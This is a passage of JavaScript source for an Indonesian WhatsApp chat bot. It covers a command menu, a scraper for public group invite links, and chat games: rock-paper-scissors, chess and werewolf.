     ヤ ◦  sound132
     ヤ ◦  sound133
     ヤ ◦  sound134
     ヤ ◦  sound135
     ヤ ◦  sound136
     ヤ ◦  sound137
     ヤ ◦  sound138
     ヤ ◦  sound139
     ヤ ◦  sound140
     ヤ ◦  sound141
     ヤ ◦  sound142
     ヤ ◦  sound143
     ヤ ◦  sound144
     ヤ ◦  sound145
     ヤ ◦  sound146
     ヤ ◦  sound147
     ヤ ◦  sound148
     ヤ ◦  sound149
     ヤ ◦  sound150
     ヤ ◦  sound151
     ヤ ◦  sound152
     ヤ ◦  sound153
     ヤ ◦  sound154
     ヤ ◦  sound155
     ヤ ◦  sound156
     ヤ ◦  sound157
     ヤ ◦  sound158
     ヤ ◦  sound159
     ヤ ◦  sound160
     ヤ ◦  sound161
     ヤ ◦  sad1
     ヤ ◦  sad2
     ヤ ◦  sad3
     ヤ ◦  sad4
     ヤ ◦  sad5
     ヤ ◦  sad6
     ヤ ◦  sad7
     ヤ ◦  sad8
     ヤ ◦  sad9
     ヤ ◦  sad10
     ヤ ◦  sad11
     ヤ ◦  sad12
     ヤ ◦  sad13
     ヤ ◦  sad14
     ヤ ◦  sad15
     ヤ ◦  sad16
     ヤ ◦  sad17
     ヤ ◦  sad18
     ヤ ◦  sad19
     ヤ ◦  sad20
     ヤ ◦  sad21
     ヤ ◦  sad22
     ヤ ◦  sad23
     ヤ ◦  sad24
     ヤ ◦  sad25
     ヤ ◦  sad26
     ヤ ◦  sad27
     ヤ ◦  sad28
     ヤ ◦  sad29
     ヤ ◦  sad30
     ヤ ◦  sad31
     ヤ ◦  sad32
     ヤ ◦  sad33
     ヤ ◦  sad34
     ヤ ◦  sad35

┈─────────────────┈⫺     
*メ C E R P E N M E N U*
┈─────────────────┈⫺
     ヤ ◦ cerpen anak
     ヤ ◦ cerpen bahasadaerah
     ヤ ◦ cerpen bahasainggris
     ヤ ◦ cerpen bahasajawa
     ヤ ◦ cerpen bahasasunda
     ヤ ◦ cerpen budaya
     ヤ ◦ cerpen cinta
     ヤ ◦ cerpen cintaislami
     ヤ ◦ cerpen cintapertama
     ヤ ◦ cerpen cintaromantis
     ヤ ◦ cerpen cintasedih
     ヤ ◦ cerpen cintasegitiga
     ヤ ◦ cerpen cintasejati
     ヤ ◦ cerpen galau
     ヤ ◦ cerpen gokil
     ヤ ◦ cerpen inspirasi
     ヤ ◦ cerpen jepang
     ヤ ◦ cerpen kehidupan
     ヤ ◦ cerpen keluarga
     ヤ ◦ cerpen kisahnyata
     ヤ ◦ cerpen korea
     ヤ ◦ cerpen kristen
     ヤ ◦ cerpen liburan
     ヤ ◦ cerpen malaysia
     ヤ ◦ cerpen mengharukan
     ヤ ◦ cerpen misteri
     ヤ ◦ cerpen motivasi
     ヤ ◦ cerpen nasihat
     ヤ ◦ cerpen olahraga
     ヤ ◦ cerpen patahhati
     ヤ ◦ cerpen penantian
     ヤ ◦ cerpen pendidikan
     ヤ ◦ cerpen pengalaman
     ヤ ◦ cerpen pengorbanan
     ヤ ◦ cerpen penyesalan
     ヤ ◦ cerpen perjuangan
     ヤ ◦ cerpen perpisahan
     ヤ ◦ cerpen persahabatan
     ヤ ◦ cerpen petualangan
     ヤ ◦ cerpen ramadhan
     ヤ ◦ cerpen remaja
     ヤ ◦ cerpen rindu
     ヤ ◦ cerpen rohani
     ヤ ◦ cerpen romantis
     ヤ ◦ cerpen sastra
     ヤ ◦ cerpen sedih
     ヤ ◦ cerpen sejarah
     
┈─────────────────┈⫺     
*メ E P H O T O M E N U*
┈─────────────────┈⫺
     ヤ ◦ glitchtext
     ヤ ◦ writetext
     ヤ ◦ advancedglow
     ヤ ◦ typographytext
     ヤ ◦ pixelglitch
     ヤ ◦ neonglitch
     ヤ ◦ flagtext
     ヤ ◦ flag3dtext
     ヤ ◦ deletingtext
     ヤ ◦ blackpinkstyle
     ヤ ◦ glowingtext
     ヤ ◦ underwatertext
     ヤ ◦ logomakerl
     ヤ ◦ cartoonstyle
     ヤ ◦ papercutstyle
     ヤ ◦ watercolortext
     ヤ ◦ effectclouds
     ヤ ◦ blackpinklogo
     ヤ ◦ gradienttext
     ヤ ◦ summerbeach
     ヤ ◦ mluxurygold
     ヤ ◦ multicoloredneon
     ヤ ◦ sandsummer
     ヤ ◦ galaxywallpaper
     ヤ ◦ 1917style
     ヤ ◦ lmakingneon
     ヤ ◦ royaltext
     ヤ ◦ freecreate
     ヤ ◦ galaxystyle
     ヤ ◦ lighteffects
     ヤ ◦ logoneko

╔══════════════════════════════╗
║  ❖  𝐅𝐄𝐄𝐋 𝐅𝐑𝐄𝐄 𝐓𝐎 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐅𝐈𝐍𝐒𝐈𝐈 𝐅𝐎𝐑 𝐀𝐍𝐘 𝐈𝐒𝐒𝐔𝐄𝐒! ║
╚══════════════════════════════╝`
        // Mengirim pesan teks dengan thumbnail
        KhaerulZx.sendMessage(m?.chat, {
            text: menuu,
            contextInfo: {
                mentionedJid: [m?.chat],
                jpegThumbnail: thumbnail2 // Menambahkan thumbnail
            }
        });

        // Mengirim audio sebagai pesan push-to-talk (PTT)
        await KhaerulZx.sendMessage(m.chat, {
            audio: fs.readFileSync('./Vn/yayaya.mp3'),
            mimetype: 'audio/mpeg',
            ptt: true
        }, { quoted: m });

        break;
}
case 'grupsearch': case 'carigcwa': {
    if (banned.includes(m.sender)) {
        return;
    }
    if (!text) return m.reply('Masukkan query pencarian, misalnya: grupsearch india');
    const cheerio = require('cheerio');
    const axios = require('axios');
    
    async function skyZo(url) {
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const links = [];
            $('a.entry-image-link').each((index, element) => {
                const href = $(element).attr('href');
                if (href) {
                    links.push(href);
                }
            });
            return links;
        } catch (error) {
            console.error('Error fetching the page:', error);
            return [];
        }
    }
    
    async function avoskyJ(url) {
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const links = [];
            let counter = 1;
            $('a[href*="chat.whatsapp.com"]').each((index, element) => {
                const href = $(element).attr('href');
                if (href) {
                    links.push(`${counter}). ${href}`);
                    counter++;
                }
            });
            return links.length > 0 ? links.join('\n') : 'Tidak ada link WhatsApp.';
        } catch (error) {
            console.error('Error fetching the page:', error);
            return 'Error.';
        }
    }
    
    const query = text.trim();
    const searchUrl = `https://whatsgrouplink.com/?s=${encodeURIComponent(query)}`;
    
    skyZo(searchUrl).then(async links => {
        if (links.length > 0) {
            const randomLink = links[Math.floor(Math.random() * links.length)];
            const result = await avoskyJ(randomLink);
            m.reply(`Link Source Yang Dipilih: ${randomLink}\n\nLink grup WhatsApp yang ditemukan:\n${result}`);
        } else {
            m.reply('Tidak ada link yang.');
        }
    }).catch(error => {
        console.error('Error:', error);
        m.reply('Terjadi kesalahan 404 Errrrr Rrorr');
    });
    break;
}
case 'listdb':
if (banned.includes(m.sender)) {
return;
}
if (!isCreator) return reply('Khusus Owner Bot!')
 tewe = '*List Database*\n\n'
for (let i of pengguna) {
tewe += `- ${i}\n`
}
tewe += `\n*Total : ${pengguna.length}*`
KhaerulZx.sendMessage(from, { text: tewe.trim() }, 'extendedTextMessage', { quoted:m, contextInfo: { "mentionedJid": pengguna } })
break
case "suitbot": {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return reply(mess.group)
let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
let salah = `Example: ${prefix+command} gunting\n\n*Pilihan yang tersedia :*\nBatu, Gunting, Kertas`
if (!text) return reply(salah)
var astro = Math.random()
if (astro < 0.34) {
astro = "batu"
} else if (astro > 0.34 && astro < 0.67) {
astro = "gunting"
} else {
astro = "kertas"
}
if (text == astro) {
reply(`*── 「 SUIT 」 ──*\n\n*Seri!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
} else if (text == "batu") {
if (astro == "gunting") {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu menang!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
} else {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu kalah!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
}
} else if (text == "gunting") {
if (astro == "kertas") {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu menang!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
} else {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu kalah!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
}
} else if (text == "kertas") {
if (astro == "batu") {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu menang!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
} else {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu kalah!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
}
} else {
return reply(salah)
}
}
break
case 'chess':{
if (banned.includes(m.sender)) {
return;
}
if (!m.isGroup) return m.reply('Khusus Grup')
const key = m.chat;
  KhaerulZx.chess = KhaerulZx.chess || {};
  let chessData = KhaerulZx.chess[key] || {
    gameData: null,
    fen: null,
    currentTurn: null,
    players: [],
    hasJoined: []
  };
  KhaerulZx.chess[key] = chessData;
  const { gameData, fen, currentTurn, players, hasJoined } = chessData;
  const feature = args[0]?.toLowerCase();

  if (feature === 'delete') {
    delete KhaerulZx.chess[key];
    return KhaerulZx.sendMessage(m.chat, '🏳️ *Permainan catur dihentikan.*', m);
  }

  if (feature === 'create') {
    if (gameData) {
      return KhaerulZx.sendMessage(m.chat, '⚠️ *Permainan sudah dimulai.*', m);
    }
    chessData.gameData = { status: 'waiting', black: null, white: null };
    return KhaerulZx.sendMessage(m.chat, '🎮 *Permainan catur dimulai.*\nMenunggu pemain lain untuk bergabung.', m);
  }

  if (feature === 'join') {
    const senderId = m.sender;
    if (players.includes(senderId)) {
      return KhaerulZx.sendMessage(m.chat, '🙅‍♂️ *Anda sudah bergabung dalam permainan ini.*', m);
    }
    if (!gameData || gameData.status !== 'waiting') {
      return KhaerulZx.sendMessage(m.chat, '⚠️ *Tidak ada permainan catur yang sedang menunggu.*', m);
    }
    if (players.length >= 2) {
      return KhaerulZx.sendMessage(m.chat, '👥 *Pemain sudah mencukupi.*\nPermainan otomatis dimulai.', m);
    }
    players.push(senderId);
    hasJoined.push(senderId);
    if (players.length === 2) {
      gameData.status = 'ready';
      const [black, white] = Math.random() < 0.5 ? [players[1], players[0]] : [players[0], players[1]];
      gameData.black = black;
      gameData.white = white;
      chessData.currentTurn = white;
      return KhaerulZx.sendMessage(m.chat, `🙌 *Pemain yang telah bergabung:*\n${hasJoined.map(playerId => `- @${playerId.split('@')[0]}`).join('\n')}\n\n*Hitam:* @${black.split('@')[0]}\n*Putih:* @${white.split('@')[0]}\n\nSilakan gunakan *'chess start'* untuk memulai permainan.`, m, { mentions: hasJoined });
    } else {
      return KhaerulZx.sendMessage(m.chat, '🙋‍♂️ *Anda telah bergabung dalam permainan catur.*\nMenunggu pemain lain untuk bergabung.', m);
    }
  }

  if (feature === 'start') {
    if (gameData.status !== 'ready') {
      return KhaerulZx.sendMessage(m.chat, '⚠️ *Tidak dapat memulai permainan. Tunggu hingga dua pemain bergabung.*', m);
    }
    gameData.status = 'playing';
    const senderId = m.sender;
    if (players.length === 2) {
      const fen = 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1';
      chessData.fen = fen;
      const encodedFen = encodeURIComponent(fen);
      const giliran = `🎲 *Giliran:* Putih @${gameData.white.split('@')[0]}`;
      const flipParam = senderId === gameData.black ? '' : '&flip=true';
      const flipParam2 = senderId === gameData.black ? '' : '-flip';
      const boardUrl = `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside${flipParam}`;
      try {
        return KhaerulZx.sendFile(m.chat, boardUrl, '', giliran, m, false, { mentions: [gameData.white] });
      } catch (error) {
        const boardUrl2 = `https://chessboardimage.com/${encodedFen + flipParam2}.png`;
        return KhaerulZx.sendFile(m.chat, boardUrl2, '', giliran, m, false, { mentions: [gameData.black] });
      }
      return;
    } else {
      return KhaerulZx.sendMessage(m.chat, '🙋‍♂️ *Anda telah bergabung dalam permainan catur.*\nMenunggu pemain lain untuk bergabung.', m);
    }
  }

  if (args[0] && args[1]) {
    const senderId = m.sender;
    if (!gameData || gameData.status !== 'playing') {
      return KhaerulZx.sendMessage(m.chat, '⚠️ *Permainan belum dimulai.*', m);
    }
    if (currentTurn !== senderId) {
      return KhaerulZx.sendMessage(m.chat, `⏳ *Sekarang giliran ${chessData.currentTurn === gameData.white ? 'Putih' : 'Hitam'} untuk bergerak.*`, m, {
        contextInfo: {
          mentionedJid: [currentTurn]
        }
      });
    }
    const chess = new Chess(fen);
    if (chess.isCheckmate()) {
      delete KhaerulZx.chess[key];
      return KhaerulZx.sendMessage(m.chat, `⚠️ *Game Checkmate.*\n🏳️ *Permainan catur dihentikan.*\n*Pemenang:* @${m.sender.split('@')[0]}`, m, {
        contextInfo: {
          mentionedJid: [m.sender]
        }
      });
    }
    if (chess.isDraw()) {
      delete KhaerulZx.chess[key];
      return KhaerulZx.sendMessage(m.chat, `⚠️ *Game Draw.*\n🏳️ *Permainan catur dihentikan.*\n*Pemain:* ${hasJoined.map(playerId => `- @${playerId.split('@')[0]}`).join('\n')}`, m, {
        contextInfo: {
          mentionedJid: hasJoined
        }
      });
    }
    const [from, to] = args;
    try {
      chess.move({ from, to, promotion: 'q' });
    } catch (e) {
      return KhaerulZx.sendMessage(m.chat, '❌ *Langkah tidak valid.*', m);
    }
    chessData.fen = chess.fen();
    const currentTurnIndex = players.indexOf(currentTurn);
    const nextTurnIndex = (currentTurnIndex + 1) % 2;
    chessData.currentTurn = players[nextTurnIndex];
    const encodedFen = encodeURIComponent(chess.fen());
    const currentColor = chessData.currentTurn === gameData.white ? 'Putih' : 'Hitam';
    const giliran = `🎲 *Giliran:* ${currentColor} @${chessData.currentTurn.split('@')[0]}\n\n${chess.getComment() || ''}`;
    const flipParam = senderId === gameData.black ? '' : '&flip=true';
    const flipParam2 = senderId === gameData.black ? '' : '-flip';
    const boardUrl = `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside${flipParam}`;
    try {
      return KhaerulZx.sendFile(m.chat, boardUrl, '', giliran, m, false, { mentions: [chessData.currentTurn] });
    } catch (error) {
      const boardUrl2 = `https://chessboardimage.com/${encodedFen + flipParam2}.png`;
      return KhaerulZx.sendFile(m.chat, boardUrl2, '', giliran, m, false, { mentions: [chessData.currentTurn] });
    }
    chess.deleteComment();
    return;
  }

  if (feature === 'help') {
    return KhaerulZx.sendMessage(m.chat, `
      🌟 *Perintah Permainan Catur:*

*chess create* - Mulai permainan catur
*chess join* - Bergabung dalam permainan catur yang sedang menunggu
*chess start* - Memulai permainan catur jika ada dua pemain yang sudah bergabung
*chess delete* - Menghentikan permainan catur
*chess [dari] [ke]* - Melakukan langkah dalam permainan catur

*Contoh:*
Ketik *chess create* untuk memulai permainan catur.
Ketik *chess join* untuk bergabung dalam permainan catur yang sedang menunggu.
    `, m);
  }
  return KhaerulZx.sendMessage(m.chat, '❓ Perintah tidak valid. Gunakan *"chess help"* untuk melihat bantuan.', m);
};
break;
case 'ww':
case 'werewolf': {
if (banned.includes(m.sender)) {
return;
}
let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    run_pagi
} = require('./lib/werewolf.js')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    KhaerulZx.werewolf = KhaerulZx.werewolf ? KhaerulZx.werewolf : {};
    const ww = KhaerulZx.werewolf ? KhaerulZx.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return m.reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return m.reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await m.reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return m.reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return m.reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return m.reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return m.reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        KhaerulZx.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return m.reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return m.reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(KhaerulZx, chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(KhaerulZx, chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_pagi(KhaerulZx, chat, ww);
            }
        }
        if (ww[chat].status === true)
            return m.reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return m.reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${KhaerulZx.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Kill Player ${ww[chat].player[p].number}`,
                        rowId: `.wwpc kill ${ww[chat].player[p].number}`,
                        description: `Untuk membunuh player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await KhaerulZx.sendMessage(ww[chat].player[i].id, listMessage);
                   
                    await KhaerulZx.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }

                // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${KhaerulZx.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await KhaerulZx.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${KhaerulZx.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;
                    
                     let row = [];
                     for (let p = 0; p < ww[chat].player.length; p++) {
                       row.push({
                         title: `Cek Player ${ww[chat].player[p].number}`,
                         rowId: `.ww dreamy ${ww[chat].player[p].number}`,
                         description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                       });
                     }
                     const sections = [
                       { title: "⌂ W E R E W O L F - G A M E", rows: row },
                     ];
                     const listMessage = {
                       text: text,
                       footer: `Player Hidup: ${playerHidup(
                         sesi(m.chat, ww)
                       )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                       title: "⌂ W E R E W O L F - G A M E\n",
                       buttonText: "Clik here!",
                       sections,
                       mentions: player,
                     };
                     await KhaerulZx.sendMessage(ww[chat].player[i].id, listMessage);
                     
                    await KhaerulZx.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${KhaerulZx.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Lindungi Player ${ww[chat].player[p].number}`,
                        rowId: `.ww deff ${ww[chat].player[p].number}`,
                        description: `Untuk melindungi player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await KhaerulZx.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await KhaerulZx.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${KhaerulZx.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;
                    
                    let row = [];
                    for (let p = 0; p < ww[chat].player.length; p++) {
                      row.push({
                        title: `Cek Player ${ww[chat].player[p].number}`,
                        rowId: `.ww sorcerer ${ww[chat].player[p].number}`,
                        description: `Untuk melihat identitas player ${ww[chat].player[p].number}`,
                      });
                    }
                    const sections = [
                      { title: "⌂ W E R E W O L F - G A M E", rows: row },
                    ];
                    const listMessage = {
                      text: text,
                      footer: `Player Hidup: ${playerHidup(
                        sesi(m.chat, ww)
                      )} Player Mati: ${playerMati(sesi(m.chat, ww))}`,
                      title: "⌂ W E R E W O L F - G A M E\n",
                      buttonText: "Clik here!",
                      sections,
                      mentions: player,
                    };
                    await KhaerulZx.sendMessage(ww[chat].player[i].id, listMessage);
                    
                    await KhaerulZx.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await KhaerulZx.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: "",
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(KhaerulZx, chat, ww);
    } else if (value === "vote") {
        if (!ww[chat]) return m.reply("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return m.reply("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return m.reply("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return m.reply("Kamu sudah mati");
        if (!target || target.length < 1)
            return m.reply("Masukan nomor player");
        if (isNaN(target)) return m.reply("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return m.reply("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return m.reply(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return m.reply("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return m.reply("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return m.reply("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return m.reply("Permainan sudah dimulai, kamu tidak bisa keluar");
        m.reply(`@${sender.split("@")[0]} Keluar dari permainan`, {
            withTag: true,
        });
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return m.reply(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        m.reply("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return m.reply("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return m.reply("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return m.reply("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        KhaerulZx.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: "",
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
        let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
